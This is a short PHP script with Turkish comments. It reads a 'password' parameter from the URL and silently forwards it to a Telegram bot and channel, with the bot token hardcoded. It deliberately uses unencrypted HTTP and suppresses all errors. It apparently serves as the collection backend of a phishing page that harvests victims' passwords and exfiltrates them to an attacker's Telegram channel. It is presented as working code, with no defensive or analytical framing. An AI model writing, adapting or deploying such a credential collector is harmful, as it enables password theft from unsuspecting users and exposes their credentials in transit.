<?php
// Çok basit versiyon - SSL hatasını tamamen önle
error_reporting(0);

if(isset($_GET['password'])) {
    $password = $_GET['password'];
    $token = "8264174079:AAF-UZZ2Eh5X0O5Ai4EVhZ6t1sxLs_mGBIM";
    $chat_id = "@muqemmelzm";
    
    // HTTP kullan (HTTPS yerine) - SSL hatasını önler
    $url = "http://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode("Password: $password");
    
    // Basit file_get_contents ile gönder
    @file_get_contents($url);
    
    echo "OK";
} else {
    echo "ERROR";
}
?>